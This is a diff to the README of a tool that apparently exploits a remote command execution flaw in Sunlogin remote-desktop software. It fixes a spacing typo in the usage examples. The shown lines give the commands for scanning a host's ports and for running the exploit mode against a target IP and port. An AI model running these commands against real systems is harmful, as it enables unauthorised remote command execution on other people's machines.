@@ -8,7 +8,7 @@ Sunlogin 远程命令执行漏洞 POC&EXP
 
 ```
 SunloginRCE -h 192.168.3.222 -p 49664,49665,49666,49667,49668,49669,49674,49819,50246,25,110,135,139,44,5040,7680,7880  // 扫描模式，多个端口用,隔开
-SunloginRCE -h 192.168.8.4:49819-m exp // EXP模式
+SunloginRCE -h 192.168.8.4:49819 -m exp // EXP模式
 ```
 ![image](https://user-images.githubusercontent.com/108780847/180644358-dbfffe2b-e38a-49ea-8728-8ba96e8cd9c7.png)
 
